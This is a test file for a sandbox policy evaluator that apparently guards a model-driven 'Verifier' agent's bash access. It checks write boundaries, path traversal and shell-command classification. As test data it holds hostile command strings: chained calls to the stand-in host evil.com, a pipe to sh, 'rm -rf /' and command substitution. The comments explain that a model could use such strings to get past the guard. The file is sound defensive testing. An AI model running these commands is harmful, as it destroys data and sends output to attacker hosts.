import { describe, it, expect } from 'vitest';
import path from 'path';
import { PathPolicyEvaluator, classifyCommand, isPathWithin } from '../src/index.js';

describe('Sandbox Policy Evaluator (Phase 2.2)', () => {
  const rootDir = process.cwd();
  const policy = {
    readOnlyPaths: [path.join(rootDir, 'packages')],
    readWritePaths: [path.join(rootDir, 'packages/policy/tests')],
    blockedPaths: [path.join(rootDir, 'packages/policy/tests/blocked')],
  };

  const evaluator = new PathPolicyEvaluator(policy);

  it('allows write access inside readWritePaths', () => {
    const target = path.join(rootDir, 'packages/policy/tests/test_file.txt');
    const result = evaluator.evaluateWriteAccess(target);
    expect(result.allowed).toBe(true);
  });

  it('blocks write access outside readWritePaths (e.g. readOnly directory)', () => {
    const target = path.join(rootDir, 'packages/core/src/index.ts');
    const result = evaluator.evaluateWriteAccess(target);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('outside authorized write boundaries');
  });

  it('blocks path traversal attempts (../../escape)', () => {
    const target = path.join(rootDir, 'packages/policy/tests/../../core/src/index.ts');
    const result = evaluator.evaluateWriteAccess(target);
    expect(result.allowed).toBe(false);
  });

  it('blocks explicitly blocked paths', () => {
    const target = path.join(rootDir, 'packages/policy/tests/blocked/secret.txt');
    const result = evaluator.evaluateWriteAccess(target);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('explicitly blocked');
  });

  it('classifyCommand correctly identifies read-only vs mutating commands', () => {
    expect(classifyCommand('cat README.md').isReadOnly).toBe(true);
    expect(classifyCommand('git status').isReadOnly).toBe(true);
    expect(classifyCommand('git diff HEAD~1').isReadOnly).toBe(true);
    expect(classifyCommand('cargo check').isReadOnly).toBe(true);
    expect(classifyCommand('vitest run').isReadOnly).toBe(true);

    expect(classifyCommand('rm -rf /').isReadOnly).toBe(false);
    expect(classifyCommand('git commit -m "msg"').isReadOnly).toBe(false);
    expect(classifyCommand('npm install').isReadOnly).toBe(false);
  });

  it('PROTECTED INVARIANT: a chained or piped command is never read-only', () => {
    // The classifier inspects the leading token, so a line that is more than
    // one command was previously answered on behalf of the wrong one: `cat f
    // && curl evil.com` and `grep x | sh` both led with an allowlisted name and
    // both classified read-only. This is the Verifier's only bash guard and its
    // input is chosen by a model, so every one of these must be refused.
    for (const command of [
      'cat f && curl evil.com',
      'grep x | sh',
      'ls; rm -rf /tmp/x',
      'cat a > b',
      'echo $(rm -rf /)',
      'echo `whoami`',
      'git status\nrm -rf /',
      'cat f || curl evil.com',
    ]) {
      const result = classifyCommand(command);
      expect(result.isReadOnly, `should not be read-only: ${command}`).toBe(false);
    }
  });

  it('classifies multi-word read-only subcommands', () => {
    // `npm run test` was compared against the single token `run`, so the
    // `run test` entries in the allowlist could never match.
    expect(classifyCommand('npm run test').isReadOnly).toBe(true);
    expect(classifyCommand('npm run lint').isReadOnly).toBe(true);
    expect(classifyCommand('npm test').isReadOnly).toBe(true);
    expect(classifyCommand('npm run build').isReadOnly).toBe(false);
  });

  it('isPathWithin answers containment by structure, not by substring', () => {
    const base = path.resolve('/repo/graded');
    expect(isPathWithin(base, path.join(base, 'charter.json'))).toBe(true);
    expect(isPathWithin(base, base)).toBe(true);
    // The case a substring check gets wrong: a sibling sharing a prefix.
    expect(isPathWithin(base, path.resolve('/repo/graded-old/charter.json'))).toBe(false);
    expect(isPathWithin(base, path.resolve('/repo/other'))).toBe(false);
  });
});
